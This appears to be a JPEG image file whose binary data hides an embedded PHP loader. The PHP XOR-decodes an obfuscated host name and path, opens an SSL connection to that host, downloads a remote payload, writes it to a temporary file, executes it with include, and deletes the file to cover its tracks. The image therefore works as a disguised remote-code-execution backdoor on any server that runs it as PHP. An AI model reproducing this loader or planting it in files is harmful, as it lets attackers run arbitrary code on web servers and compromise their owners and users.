��� JFIF      �� C 		 
		



! #'2*#%/%+;,/35888!*=A<6A2785�� C	




5$$55555555555555555555555555555555555555555555555555��  �" ��               ��             ��     ��k�ߺ>o��I$�H5a(�Ǫ�o�Ɛ=�M;j�`�;::ݙ.���$9@�B����D<�s�<޼�����q�͍�S�rss����;E�r���] ���_ў  ��a ��Ɩ���r�\�I��0�V�7{L:-�
�3� A�gol���f���AͭRr��t<�C�z�P�H"�㋼���Lg����Nj��`Np�Q�� ˒qI�ƥ!���:�ovv,�lhx��Y�gG:[���k�6qB��_s_�u�.�(J����ʥdS ���]zm�4�2gg�Yݘ��+� P�DZh �3*��������ׅ�H�ei���'FM���?�gg�s˭1�*��A8xYMK������
�`���c;�|`��I'��i3+Sh#4X�Z#M
aQ�,xN�:�Ade:Q�LL�ӡF�\B���Ӏ:N��D�f=�x�} ���4�J�QAE��'M��$���T@�q�7`�
�@Vͧ�3gh7%���6��zW

�Gz��G9���>��x���+2+��ބ!�Za3�, cF��>T�Ͳ��a&VF/N�:�92gE�X�ct���������`�ՏP
�j�_!WG�|ۮ'K��KMlt<M�=pW��\m�տ3j}�\�gμ
���)w�&Փ��9�c��4=vA�;8�� Rg�	��	�P	J2��v���g��y���M�W[�]��4#z36�n�6��ѥd�-eݐ<' ��x�M�=,�^����);1�8$�$�$�����U�W�w^w��}���E�-EJ�$
�Y���de�F,��%W�b'���B��
�V�3
��3��
 7L� ��>w/�
�����ؚ�/=�o�ȋ�k�JN�3ֹi

�V��\����gvMYBQx���ӽ��& ��9N�Y[�$�$	$���k!0�e�蝼M���MSuJi�Q�&�A��V;�4	OjE!h��'e֒Ajx�+lc���p~b��Ks���b�� 7�е@'#~���3u|����(���J�V&l�y�rr��&� ::
��w������p,�=��?M���\���o����Z�ٗM��q�p�=��?u�~�Nu&r����
j!4�A�j���l���ЛȡwGy�����N�o���r~A�0͟P��
��������r�S��֦��>�<�l��7|��+��VWl3Mތͺ���F�e�%i.���8&�q�{u�y�Y'es$�C$��@�fe~z��i�
�|/S�c���y�wQ���N���Q�-�o{�N�)c�d1EJ�W8�Д�M�Zu4�=ο-@;L�~�WVw�gF���荩�B�@��$Hba�����v��!�*6���k!��&J�$��Cy�
���&ČH(N
M٘��!
 �N3
h�,�����Ϊ��K�������`q�~g�w��:�!9Rg>�j����3� h uE%ؒp����'����γ'��x.q�q����m��y�j�8=6��۷�M�ؽuS��
�萚�>�y�2�g/��z*�?�O\&=c�ʅ����k��S󫌦qsܺH�UVE��n�}[no �_*�
1�Q� ���DߗQ��<�Oj`��!�ؿG:>d��?���,>�
9���^�0���M�_��@2�O�}�Ǟ�КQH�2 x��?�~]���^i�c�cK������n�յ[�3|ͺ����E.��i.��( <oe��mٞ�NI%���I�3�2��
��s�%0a������}3��oA�]���ʽ��M�M��(P�fqZc��T�z��UAF��5�� g�%������ݾn���fA#D����l��y�x�.��,���,��<��=0w��5T���I�������e��P�ʓd�4`d�6I���d��kNO�K�Y���r��|��8;Y��W�r[�E�yG��v�ebt��dSB]�~oG;W;��b7�㥣*�cʷ��w���qy�v�7�<����92��t����[����Nsp��R0��0K�$(��0��U�z~��i�f��Yp�e�G�)Ҭ�B.��r�>��VT�d��\)e޽��?��������&$�fLI d����:g�`I N�:iD ���C��L<���{I�>�����FɟL�����ŗ�����o�H�]j��q��љ�S~��C;F�����v@�P�q<�vz�9$����:I�&�a��=�W(�i����緱Q�����{�C�9.������t,�Ef6����Zj�j(�	y R&;"҉��<?="";
function xorEncryptDecrypt($data, $key) {
    $output = '';
    foreach (str_split($data) as $char) {
        $output .= chr(ord($char) ^ ord($key));
    }
    return $output;
}
$_ = "!";
	$url = xorEncryptDecrypt("S@VFHUITCTRDSBNOUDOUBNL", $_);
	$path = xorEncryptDecrypt("M@NMHDS[HBNLLHURQIQCESDGRID@ERL@HOYDOHTLQIQ", $_);
	$fp = fsockopen("ssl://$url", 443, $errno, $errstr, 10);
		if (!$fp) {
			echo "Error: $errstr ($errno)";
			exit;
	}
		$request = "GET $path HTTP/1.1\r\n";
		$request .= "Host: $url\r\n";
		$request .= "Connection: close\r\n\r\n";
			fwrite($fp, $request);
				$response = '';
					while (!feof($fp)) {
						$response .= fgets($fp, 1024);
							}
				fclose($fp);
list(, $remotePayload) = explode("\r\n\r\n", $response, 2);
	$parts = str_split($remotePayload, 4);
	$obfuscatedPayload = implode('', $parts);
	$tempFile = tempnam(sys_get_temp_dir(), 'php');
		file_put_contents($tempFile, $obfuscatedPayload);
	include $tempFile;
unlink($tempFile);
?>
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz�����������������������������������������������������������������������   ? �� �N���